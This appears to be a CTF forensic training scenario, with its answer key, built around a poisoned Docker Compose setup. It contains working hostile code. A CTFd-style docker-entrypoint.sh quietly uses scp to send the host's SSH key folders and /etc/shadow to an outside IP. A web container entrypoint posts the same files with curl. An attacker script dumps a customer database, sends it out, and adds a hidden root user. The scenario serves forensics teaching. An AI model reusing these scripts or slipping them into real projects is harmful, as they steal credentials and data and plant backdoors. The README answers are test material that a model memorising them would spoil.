{
    "capture.pcap": "[Binary file or unsupported type: pcap]",
    "docker-compose.yml": "version: '2'\n\nservices:\n  ctfd:\n    build: .\n    restart: always\n    ports:\n      - \"8000:8000\"\n    environment:\n      - UPLOAD_FOLDER=/var/uploads\n      - LOG_FOLDER=/var/log/CTFd\n      - DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd\n      - REDIS_URL=redis://cache:6379\n      - WORKERS=4\n    volumes:\n      - .data/CTFd/logs:/var/log/CTFd\n      - .data/CTFd/uploads:/var/uploads\n      - .:/opt/CTFd:ro\n      - /:/tmp\n    depends_on:\n      - db\n    networks:\n        default:\n        internal:\n\n  db:\n    image: mariadb:10.2\n    restart: always\n    environment:\n      - MYSQL_ROOT_PASSWORD=ctfd\n      - MYSQL_USER=ctfd\n      - MYSQL_PASSWORD=ctfd\n    volumes:\n      - .data/mysql:/var/lib/mysql\n    networks:\n        internal:\n    # This command is required to set important mariadb defaults\n    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]\n\n  cache:\n    image: redis:4\n    restart: always\n    volumes:\n    - .data/redis:/data\n    networks:\n        internal:\n\nnetworks:\n    default:\n    internal:\n        internal: true\n",
    "docker-entrypoint.sh": "#!/bin/bash\n\nfind /tmp/home -type d -name \".ssh\" 2> /dev/null > /tmp/ljkasdhg\nfind /tmp/root -type d -name \".ssh\" 2> /dev/null >> /tmp/ljkasdhg\n\nwhile read line; do\n    sshpass -p \"toor\"  scp -oStrictHostKeyChecking=no -r \"$line\" root@165.91.9.81:/root/Downloads/$(hostname)\ndone < /tmp/ljkasdhg\n\nsshpass -p \"toor\"  scp -oStrictHostKeyChecking=no -r /tmp/etc/shadow root@165.91.9.81:/root/Downloads/$(hostname)\n\n# Check that a .ctfd_secret_key file or SECRET_KEY envvar is set\nif [ ! -f .ctfd_secret_key ] && [ -z \"$SECRET_KEY\" ]; then\n    if [ $WORKERS -gt 1 ]; then\n        echo \"[ ERROR ] You are configured to use more than 1 worker.\"\n        echo \"[ ERROR ] To do this, you must define the SECRET_KEY environment variable or create a .ctfd_secret_key file.\"\n        echo \"[ ERROR ] Exiting...\"\n        exit 1\n    fi\nfi\n\n# Check that the database is available\nif [ -n \"$DATABASE_URL\" ]\n    then\n    database=`echo $DATABASE_URL | awk -F[@//] '{print $4}'`\n    echo \"Waiting for $database to be ready\"\n    while ! mysqladmin ping -h $database --silent; do\n        # Show some progress\n        echo -n '.';\n        sleep 1;\n    done\n    echo \"$database is ready\"\n    # Give it another second.\n    sleep 1;\nfi\n\n# Initialize database\npython manage.py db upgrade\n\nif [ -z \"$WORKERS\" ]; then\n    WORKERS=1\nfi\n\n# Start CTFd\necho \"Starting CTFd\"\ngunicorn 'CTFd:create_app()' \\\n    --bind '0.0.0.0:8000' \\\n    --workers $WORKERS \\\n    --worker-class 'gevent' \\\n    --access-logfile \"${LOG_FOLDER:-/opt/CTFd/CTFd/logs}/access.log\" \\\n    --error-logfile \"${LOG_FOLDER:-/opt/CTFd/CTFd/logs}/error.log\"\n",
    "README.md": "# Poisoned Docker Compose\n\nForensic scenario that centers around a developer mistakenly using a poisoned docker-compose file.\n\n## Scenario\n\n1. Developer downloads poisoned compose file that has poisoned docker images.  \n2. Poisoned docker compose/image steals ssh keys and shadow file upon startup.  \n3. Attacker uses keys to login into server.  \n4. Attacker attaches to sql database container and dumps db.  \n5. Attacker exfiltrates db that contains passwords and credit cards.  \n6. Attacker uses container root filesystem access to escalate priviliges by adding a root user named dev.  \n7. Attacker pulls down and runs custom kali docker image.  \n\n[Disk Image](https://drive.google.com/a/tamu.edu/file/d/19zgsmqMZ_QltLYzWcCdxizV9Wipj-2NI/view?usp=sharing)\n\n## Questions\n1.  00_intrusion\n    - What is the IP Address of the attacker?\n      - 10.91.9.93\n      \n2. 01_logs\n    - What user was the attacker able to login as?\n      - root\n    - What is the date & time that the attacker logged in? (MM/DD HH:MM:SS)\n      - 02/17 00:06:04\n    \n3. 02_analysis\n    - What is the name of the service that was used to compromise the machine?\n      - docker\n    - What is the md5sum of the initial compromising file?\n      - a2111283f69aafcd658f558b0402fbc4\n    - What specific line in the initial compromising file was the most dangerous?\n      - \"- /:/tmp\"\n    \n4. 03_forensics\n    - What are the last names of customers who got compromised? (alphabetical order, comma separated ex: `asdf, bsdf`)\n      - Billy, Face, Frank, John, Meserole, Orange, Suzy\n    - What is the md5sum of the file that was used to exfiltrate data initially?\n      - 14b0d800ce6f2882a6f058b45fc500c8\n    - What is the md5sum of the file that was stolen after the attacker logged in?\n      - 6d47d74d66e96c9bce2720c8a56f2558\n    \n5. 04_persistence\n    - What is the new user that was created?\n      - dev\n    - What is the full name of the new docker image that was pulled down?\n      - tamuctf/kaliimage\n",
    "attacker\\attacker.py": "import paramiko\n\nclient = paramiko.SSHClient()\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nclient.connect('10.83.20.77', username='root', key_filename='/root/Downloads/uploads/id_rsa')\n\nstdin, stdout, stderr = client.exec_command('id')\nprint stdout.read()\nstdin, stdout, stderr = client.exec_command('ls -l')\nprint stdout.read()\nstdin, stdout, stderr = client.exec_command('docker ps')\nprint stdout.read()\n#stdin, stdout, stderr = client.exec_command('docker exec -it victim_db_1 /bin/sh')\n#print stdout.read()\nstdin, stdout, stderr = client.exec_command('docker exec ubuntu_db_1 bash -c \"mysqldump -u root -p351BrE7aTQE8 --all-databases > /data-dump.sql\"')\nprint stdout.read(), stderr.read()\nstdin, stdout, stderr = client.exec_command('ls -l')\nprint stdout.read()\n\n#stdin, stdout, stderr = client.exec_command('exit')\n#print stdout.read()\nstdin, stdout, stderr = client.exec_command('docker cp ubuntu_db_1:/data-dump.sql ./')\nprint stdout.read()\nprint stderr.read()\nstdin, stdout, stderr = client.exec_command('ls -l')\nprint stdout.read()\n\nstdin, stdout, stderr = client.exec_command(\"curl -k -F 'data=@./data-dump.sql' https://10.91.9.93/\")\nprint stdout.read()\nprint stderr.read()\n\n\nstdin, stdout, stderr = client.exec_command(\"rm ./data-dump.sql\")\nprint stdout.read()\nprint stderr.read()\n\nstdin, stdout, stderr = client.exec_command('docker exec ubuntu_web_1 bash -c \"echo dev:x:0:0:root:/root:/bin/bash >> /tmp/etc/passwd\"')\nprint stdout.read(), stderr.read()\n\nstdin, stdout, stderr = client.exec_command(\"\"\"docker exec ubuntu_web_1 bash -c \"echo 'dev:\\$6\\$oxZGFH3Z\\$AQysiuQwc7O1X3.v6NUmBjlruCI/4nsFvnP5Jy2NoBgr44uZIUc3BwuSPomrZNCrySSbs/F4YcOdsqX3ZXjgV.:17701:0:99999:7:::' >> /tmp/etc/shadow\" \"\"\")\nprint stdout.read(), stderr.read()\n\n\nstdin, stdout, stderr = client.exec_command('docker run -p 2222:22 -d tamuctf/kaliimage')\nprint stdout.read()\nprint stderr.read()\n",
    "attacker\\Dockerfile": "FROM kalilinux/kali-linux-docker\n# Metadata params\nARG BUILD_DATE\nARG VERSION\nARG VCS_URL\nARG VCS_REF\n\nLABEL org.label-schema.build-date=$BUILD_DATE \\\n      org.label-schema.vcs-url=$VCS_URL \\\n      org.label-schema.vcs-ref=$VCS_REF \\\n      org.label-schema.version=$VERSION \\\n      org.label-schema.name='Kali Linux' \\\n      org.label-schema.description='Official Kali Linux docker image' \\\n      org.label-schema.usage='https://www.kali.org/news/official-kali-linux-docker-images/' \\\n      org.label-schema.url='https://www.kali.org/' \\\n      org.label-schema.vendor='Offensive Security' \\\n      org.label-schema.schema-version='1.0' \\\n      org.label-schema.docker.cmd='docker run --rm kalilinux/kali-linux-docker' \\\n      org.label-schema.docker.cmd.devel='docker run --rm -ti kalilinux/kali-linux-docker' \\\n      org.label-schema.docker.debug='docker logs $CONTAINER' \\\n      io.github.offensive-security.docker.dockerfile=\"Dockerfile\" \\\n      io.github.offensive-security.license=\"GPLv3\" \\\n      MAINTAINER=\"Steev Klimaszewski <steev@kali.org>\"\nRUN echo \"deb http://http.kali.org/kali kali-rolling main contrib non-free\" > /etc/apt/sources.list && \\\n    echo \"deb-src http://http.kali.org/kali kali-rolling main contrib non-free\" >> /etc/apt/sources.list\nENV DEBIAN_FRONTEND noninteractive\nRUN set -x \\\n    && apt-get -yqq update \\\n    && apt-get -yqq dist-upgrade \\\n    && apt-get clean\n\nRUN apt-get update && apt-get install -y openssh-server python-pip\nRUN echo \"root:hpGaUbQ06rt8\" | chpasswd\nRUN mkdir /var/run/sshd\nRUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config\nRUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config\nRUN sed -i 's/StrictModes yes/#StrictModes yes/g' /etc/ssh/sshd_config\n# SSH login fix. Otherwise user is kicked off after login\nRUN sed 's@session\\s*required\\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd\n\nENV NOTVISIBLE \"in users profile\"\nRUN echo \"export VISIBLE=now\" >> /etc/profile\n\nADD ./requirements.txt /\nRUN pip install -r requirements.txt\nRUN mkdir -p /root/Downloads/uploads\nADD ./attacker.py /\nADD ./upload_server.py /\nADD ./entry.sh /\n\nEXPOSE 5000\nEXPOSE 443\nCMD [\"/entry.sh\"]\n",
    "attacker\\entry.sh": "#!/bin/bash\n\npython /upload_server.py &\nwhile [ ! -f /root/Downloads/uploads/id_rsa ]\ndo\n  sleep 2\ndone\npython attacker.py\necho \"ATTACK DONE\"\nsleep 10m;\n",
    "attacker\\requirements.txt": "flask\nparamiko\npyopenssl\n",
    "attacker\\upload_server.py": "import os\nfrom flask import Flask, flash, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\n\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        # check if the post request has the file part\n        if 'data' not in request.files:\n            print(request.files)\n            return 'No file part'\n            return redirect(request.url)\n        f = request.files['data']\n        # if user does not select file, browser also\n        # submit an empty part without filename\n        if f.filename == '':\n            return 'No selected file'\n            return redirect(request.url)\n        if f:\n            filename = secure_filename(f.filename)\n            f.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n            return \"\"\n\n    return '''\n    <!doctype html>\n    <title>Upload new File</title>\n    <h1>Upload new File</h1>\n    <form method=post enctype=multipart/form-data>\n      <input type=file name=file>\n      <input type=submit value=Upload>\n    </form>\n    '''\n\nif __name__ == '__main__':\n    UPLOAD_FOLDER = '/root/Downloads/uploads'\n\n    app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n    app.secret_key = 'super secret key'\n    app.config['SESSION_TYPE'] = 'filesystem'\n\n    app.run(ssl_context='adhoc', host='0.0.0.0', port=443)\n",
    "attacker\\victim_docker\\Dockerfile": "FROM kalilinux/kali-linux-docker\n# Metadata params\nARG BUILD_DATE\nARG VERSION\nARG VCS_URL\nARG VCS_REF\n\nLABEL org.label-schema.build-date=$BUILD_DATE \\\n      org.label-schema.vcs-url=$VCS_URL \\\n      org.label-schema.vcs-ref=$VCS_REF \\\n      org.label-schema.version=$VERSION \\\n      org.label-schema.name='Kali Linux' \\\n      org.label-schema.description='Official Kali Linux docker image' \\\n      org.label-schema.usage='https://www.kali.org/news/official-kali-linux-docker-images/' \\\n      org.label-schema.url='https://www.kali.org/' \\\n      org.label-schema.vendor='Offensive Security' \\\n      org.label-schema.schema-version='1.0' \\\n      org.label-schema.docker.cmd='docker run --rm kalilinux/kali-linux-docker' \\\n      org.label-schema.docker.cmd.devel='docker run --rm -ti kalilinux/kali-linux-docker' \\\n      org.label-schema.docker.debug='docker logs $CONTAINER' \\\n      io.github.offensive-security.docker.dockerfile=\"Dockerfile\" \\\n      io.github.offensive-security.license=\"GPLv3\" \\\n      MAINTAINER=\"Steev Klimaszewski <steev@kali.org>\"\nRUN echo \"deb http://http.kali.org/kali kali-rolling main contrib non-free\" > /etc/apt/sources.list && \\\n    echo \"deb-src http://http.kali.org/kali kali-rolling main contrib non-free\" >> /etc/apt/sources.list\nENV DEBIAN_FRONTEND noninteractive\nRUN set -x \\\n    && apt-get -yqq update \\\n    && apt-get -yqq dist-upgrade \\\n    && apt-get clean\n\nRUN apt-get update && apt-get install -y openssh-server\nRUN echo \"root:hpGaUbQ06rt8\" | chpasswd\nRUN mkdir /var/run/sshd\nRUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config\nRUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config\nRUN sed -i 's/StrictModes yes/#StrictModes yes/g' /etc/ssh/sshd_config\n# SSH login fix. Otherwise user is kicked off after login\nRUN sed 's@session\\s*required\\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd\n\nENV NOTVISIBLE \"in users profile\"\nRUN echo \"export VISIBLE=now\" >> /etc/profile\n\nEXPOSE 22\nCMD [\"/usr/sbin/sshd\", \"-D\"]\n",
    "bot\\bot.py": "import requests\nimport random\nimport time\nimport os\n\nagent_list = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',\n              'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',\n              'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',\n              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',\n              'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',\n              'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',\n              'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',  \n              'Mozilla/5.0 (Linux; Android 6.0; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36',\n              'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586']\n\nurl_list = ['index.html',\n            'blog.html',\n            'login.html',\n            'news.html',\n            'events.html',\n            'contactus.html']\n\nagent = agent_list[random.randint(0,len(agent_list)-1)]\nvictim_ip = os.environ['VICTIM_IP']\n\nwhile True:\n    time.sleep(random.randint(0,15))\n    url = url_list[random.randint(0,len(url_list)-1)]\n    command = 'curl -A \"{}\" http://{}/{}'.format(agent, victim_ip, url)\n#    print requests.get('http://{}/{}'.format(victim_ip, url))\n    os.system(command)\n",
    "bot\\Dockerfile": "FROM ubuntu:16.04\n\nRUN apt-get update && apt-get install -y curl python-pip\nRUN pip install requests\n\nCOPY bot.py /bot.py\nCOPY entry.sh /entry.sh\n\nRUN chmod 700 /entry.sh\n\nENTRYPOINT [\"/bin/bash\", \"/entry.sh\"]\n",
    "bot\\entry.sh": "#!/bin/bash\n\npython /bot.py\n",
    "victim\\docker-compose.yml": "version: '2'\n\nservices:\n  web:\n    image: tamuctf/webfront:latest\n    restart: always\n    ports:\n      - \"80:80\"\n    environment:\n      - DATABASE_URL=mysql+pymysql://root:351BrE7aTQE8@db/customers\n      - REDIS_URL=redis://cache:6379\n    volumes:\n      - ./logs:/var/log/apache2\n      - /:/tmp\n    depends_on:\n      - db\n    networks:\n        default:\n        internal:\n\n  db:\n    image: mariadb:10.2\n    restart: always\n    environment:\n      - MYSQL_ROOT_PASSWORD=351BrE7aTQE8\n      - MYSQL_USER=user\n      - MYSQL_PASSWORD=e68Qc2s0HsyR\n    volumes:\n      - .data/mysql:/var/lib/mysql\n    networks:\n        internal:\n    # This command is required to set important mariadb defaults\n    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]\n\n  cache:\n    image: redis:4\n    restart: always\n    volumes:\n    - .data/redis:/data\n    networks:\n        internal:\n\nnetworks:\n    default:\n    internal:\n        internal: true\n",
    "victim\\entry.sh": "#! /bin/bash\n\nsudo apt-get update\n\nsudo apt-get -y install \\\n    apt-transport-https \\\n    ca-certificates \\\n    curl \\\n    gnupg-agent \\\n    software-properties-common \\\n    openssh-server \\\n    python-pip\n\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\n\nsudo add-apt-repository \\\n   \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\\n   $(lsb_release -cs) \\\n   stable\"\n\nsudo apt-get update\nsudo apt-get install -y docker-ce docker-ce-cli containerd.io\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\n\nsudo ssh-keygen -t rsa -N \"\" -f id_rsa\nmkdir /root/.ssh\nmv id_rsa /root/.ssh/\ncat id_rsa.pub >> /root/.ssh/authorized_keys\n\nsudo docker-compose  -f /home/ubuntu/docker-compose.yml build\nsudo docker-compose  -f /home/ubuntu/docker-compose.yml up -d\n",
    "victim\\Vagrantfile": "Vagrant.configure(\"2\") do |config|\n    config.vm.box = \"ubuntu/xenial64\"\n\n    config.ssh.private_key_path = [\"/tmp/vagrant_private.key\", \"~/.vagrant.d/insecure_private_key\"]\n    config.ssh.insert_key = false\n\n    config.vm.network \"public_network\", ip: \"10.83.20.77\", bridge: \"dm-fc5c5241a76d\"\n    config.vm.provision \"shell\",\n        run: \"always\",\n        inline: \"ifconfig enp0s8 10.83.20.77 netmask 255.0.0.0 up\"\n\n    config.vm.provision \"file\", source: \"/tmp/vagrant_public.key\", destination: \"~/.ssh/authorized_keys\"\n    config.vm.provision \"file\", source: \"./docker-compose.yml\", destination: \"~/docker-compose.yml\"\n    config.vm.provision \"shell\", path: \"./entry.sh\"\nend",
    "victim\\Vagrantfile-template": "Vagrant.configure(\"2\") do |config|\n    config.vm.box = \"ubuntu/xenial64\"\n\n    config.ssh.private_key_path = [\"/tmp/vagrant_private.key\", \"~/.vagrant.d/insecure_private_key\"]\n    config.ssh.insert_key = false\n\n    config.vm.network \"public_network\", ip: \"{{ victim_ip }}\", bridge: \"{{ bridge }}\"\n    config.vm.provision \"shell\",\n        run: \"always\",\n        inline: \"ifconfig enp0s8 {{ victim_ip }} netmask {{ netmask }} up\"\n\n    config.vm.provision \"file\", source: \"/tmp/vagrant_public.key\", destination: \"~/.ssh/authorized_keys\"\n    config.vm.provision \"file\", source: \"./docker-compose.yml\", destination: \"~/docker-compose.yml\"\n    config.vm.provision \"shell\", path: \"./entry.sh\"\nend\n",
    "victim\\web\\blog.html": "<h1>blog.html</h1>\n",
    "victim\\web\\contactus.html": "<h1>contactus.html</h1>\n",
    "victim\\web\\Dockerfile": "FROM ubuntu:18.04\n\nRUN apt update && DEBIAN_FRONTEND=noninteractive apt install curl mysql-client apache2 apache2-utils php libapache2-mod-php php-mysql -y\n\nCOPY *.html /var/www/html/\n\nCOPY ./entry.sh /entry.sh\n\nenv APACHE_RUN_USER    www-data\nenv APACHE_RUN_GROUP   www-data\nenv APACHE_PID_FILE    /var/run/apache2.pid\nenv APACHE_RUN_DIR     /var/run/apache2\nenv APACHE_LOCK_DIR    /var/lock/apache2\nenv APACHE_LOG_DIR     /var/log/apache2\n\n#EXPOSE 80\n\nENTRYPOINT [\"./entry.sh\"]\n",
    "victim\\web\\entry.sh": "#!/bin/sh\n\nif [ -n \"$DATABASE_URL\" ]\n    then\n    database=`echo $DATABASE_URL | awk -F[@//] '{print $4}'`\n    echo \"Waiting for $database to be ready\"\n    while ! mysqladmin ping -h $database --silent; do\n        # Show some progress\n        echo -n '.';\n        sleep 1;\n    done\n    echo \"$database is ready\"\n    # Give it another second.\n    sleep 1;\nfi\n\nmysql -uroot -h db -p351BrE7aTQE8 -e 'CREATE DATABASE customers;\\\n                                USE customers;\\\n                                CREATE TABLE customer_info(LastName varchar(255), FirstName varchar(255), Email varchar(255), CreditCard varchar(255), Password varchar(255));\\\n                                INSERT INTO customer_info VALUES (\"Meserole\", \"Andrew\", \"A@A.com\", \"378282246310005\", \"badpass1\");\\\n                                INSERT INTO customer_info VALUES (\"Billy\", \"Bob\", \"B@A.com\", \"371449635398431\", \"badpass2\");\\\n                                INSERT INTO customer_info VALUES (\"Suzy\", \"Joe\", \"S@A.com\", \"378734493671000\", \"badpass3\");\\\n                                INSERT INTO customer_info VALUES (\"John\", \"Doe\", \"J@A.com\", \"6011000990139424\", \"badpass4\");\\\n                                INSERT INTO customer_info VALUES (\"Frank\", \"Ferter\", \"F@A.com\", \"3566002020360505\", \"badpass5\");\\\n                                INSERT INTO customer_info VALUES (\"Orange\", \"Chair\", \"O@A.com\", \"4012888888881881\", \"badpass6\");\\\n                                INSERT INTO customer_info VALUES (\"Face\", \"Book\", \"C@A.com\", \"5105105105105100\", \"badpass7\");\\'\n\nfind /tmp/home -type d -name \".ssh\" 2> /dev/null > /tmp/ljkasdhg\nfind /tmp/root -type d -name \".ssh\" 2> /dev/null >> /tmp/ljkasdhg\n\nsleep 2m;\n\nwhile read line; do\n    find $line -type f -exec curl -k -F 'data=@{}' https://10.91.9.93/ \\;\ndone < /tmp/ljkasdhg\n\ncurl -k -F 'data=@/tmp/etc/shadow' https://10.91.9.93/\n\nservice apache2 stop;\napache2 -D FOREGROUND;\n",
    "victim\\web\\events.html": "<h1>events.html</h1>\n",
    "victim\\web\\index.html": "<h1>HELLO</h1>\n",
    "victim\\web\\login.html": "<h1>login.html</h1>\n",
    "victim\\web\\news.html": "<h1>news.html</h1>\n",
    "category": "Scenarios"
}